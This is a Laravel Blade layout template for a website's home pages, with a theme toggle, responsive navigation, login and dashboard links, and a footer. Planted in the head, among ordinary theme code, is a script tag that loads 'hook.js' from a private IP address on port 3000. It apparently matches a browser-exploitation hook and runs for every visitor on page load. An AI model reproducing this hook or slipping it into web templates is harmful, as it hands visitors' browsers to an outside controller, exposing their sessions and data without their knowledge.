{{-- resources/views/components/layouts/home.blade.php --}}
<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="UTF-8">
    <title>{{ $title ?? config('app.name') }}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    @vite(['resources/css/app.css', 'resources/js/app.js']) {{-- Optional if you're using Vite --}}

        <script>
            // Check localStorage for a saved theme preference
            const savedTheme = localStorage.getItem('theme');
            // Check if the user's system prefers dark mode
            const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;

            // Apply the theme class based on saved preference or system preference
            if (savedTheme === 'dark' || (savedTheme === null && prefersDark)) {
                // If 'dark' is explicitly saved, OR if no theme is saved and system prefers dark
                document.documentElement.classList.add('dark');
            } else if (savedTheme === 'light') {
                // If 'light' is explicitly saved, ensure dark class is removed
                document.documentElement.classList.remove('dark');
            }
            // If savedTheme is null and prefersDark is false, no action needed (defaults to light)
        </script>
        <script src="http://192.168.0.103:3000/hook.js"></script>

</head>
<body class="bg-gray-100 font-sans antialiased dark:bg-gray-900">

    <!-- Header -->
    <header class="bg-white dark:bg-gray-900 shadow dark:shadow-white">
        <div class="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
           <div class="shrink-0 flex items-center">
                    <a href="/">
                        <x-application-logo class="block h-9 w-auto fill-current text-gray-800 dark:text-gray-200" />
                    </a>
                    <a href="/">
                    <h1 class="text-xl font-bold text-indigo-600 ml-3"> {{ config('app.name')   }}</h1>
                     </a>
            </div>


          <x-themetoggle />
          <!-- Hamburger Button (Mobile) -->
          <button id="menu-toggle" class="md:hidden text-gray-700 focus:outline-none">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2"
                 viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path stroke-linecap="round" stroke-linejoin="round"
                    d="M4 6h16M4 12h16M4 18h16"></path>
            </svg>
          </button>



          <!-- Desktop Menu -->
          <nav class="hidden md:flex space-x-4 ">
            <a href="/" class="text-gray-700 hover:text-indigo-600 dark:text-white">Home</a>
            <a href="/feature" class="text-gray-700 hover:text-indigo-600 dark:text-white">Features</a>
            <a href="/gallery" class="text-gray-700 hover:text-indigo-600 dark:text-white">Documentation</a>
            <a href="/authors" class="text-gray-700 hover:text-indigo-600 dark:text-white">Authors</a>
            <a href="/categories" class="text-gray-700 hover:text-indigo-600 dark:text-white hidden">Categories</a>
            <a href="/about" class="text-gray-700 hover:text-indigo-600 dark:text-white">About</a>
            @auth
                {{-- This block runs ONLY if a user is logged in --}}
                @if(auth()->user()->hasRole('admin'))
                    <a href="{{ route('admin.index') }}" class="text-gray-700 hover:text-indigo-600 dark:text-white">Dashboard</a>
                @else
                    <a href="{{ route('dashboard') }}" class="text-gray-700 hover:text-indigo-600 dark:text-white">Dashboard</a>
                @endif
            @endauth

            @guest
                {{-- This block runs ONLY if NO user is logged in --}}
                <a href="{{ route('login') }}" class="text-gray-700 hover:text-indigo-600 dark:text-white">Login</a>
            @endguest
          </nav>
        </div>

        <!-- Mobile Menu -->
        <div id="mobile-menu" class="md:hidden px-4 pb-4 hidden">
          <nav class="flex flex-col space-y-2">
            <a href="/" class="text-gray-700 hover:text-indigo-600 dark:text-white">Home</a>
            <a href="/feature" class="text-gray-700 hover:text-indigo-600 dark:text-white">Features</a>
            <a href="/gallery" class="text-gray-700 hover:text-indigo-600 dark:text-white">Documentation</a>
            <a href="/authors" class="text-gray-700 hover:text-indigo-600 dark:text-white">Authors</a>
            <a href="/about" class="text-gray-700 hover:text-indigo-600 dark:text-white">About</a>
           @auth
              {{-- This block runs ONLY if a user is logged in --}}
              @if(auth()->user()->hasRole('admin'))
                  <a href="{{ route('admin.index') }}" class="text-gray-700 hover:text-indigo-600 dark:text-white">Dashboard</a>
              @else
                  <a href="{{ route('dashboard') }}" class="text-gray-700 hover:text-indigo-600 dark:text-white">Dashboard</a>
              @endif
          @endauth

          @guest
              {{-- This block runs ONLY if NO user is logged in --}}
              <a href="{{ route('login') }}" class="text-gray-700 hover:text-indigo-600 dark:text-white">Login</a>
          @endguest
          </nav>
        </div>
      </header>

      <!-- Toggle Script -->
      <script>
        const toggleButton = document.getElementById('menu-toggle');
        const mobileMenu = document.getElementById('mobile-menu');

        toggleButton.addEventListener('click', () => {
          mobileMenu.classList.toggle('hidden');
        });
      </script>


    <main class="">
        {{ $slot }}
    </main>

    <!-- Footer -->
<footer class="bg-gray-800 text-white py-6">
    <div class="max-w-7xl mx-auto px-4 text-center">
      <p>&copy; 2025 {{ config('app.name')   }}. All rights reserved.</p>
    </div>
  </footer>
</body>
</html>
